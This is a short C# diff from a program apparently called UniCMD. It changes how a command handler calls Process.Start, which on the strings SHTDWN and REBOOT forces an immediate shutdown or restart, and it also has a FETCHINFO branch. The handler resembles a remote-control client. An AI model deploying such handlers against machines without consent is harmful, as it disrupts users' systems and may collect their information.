@@ -108,11 +108,11 @@ namespace UniCMD
                     }
                     if (CMD == "SHTDWN")
                     {
-                        Process.Start("shutdown", "/s /t 0");
+                        System.Diagnostics.Process.Start("shutdown", "/s /t 0");
                     }
                     if (CMD == "REBOOT")
                     {
-                        Process.Start("shutdown", "/r /t 0");
+                        System.Diagnostics.Process.Start("shutdown", "/r /t 0");
                     }
                     if (CMD == "FETCHINFO")
                     {
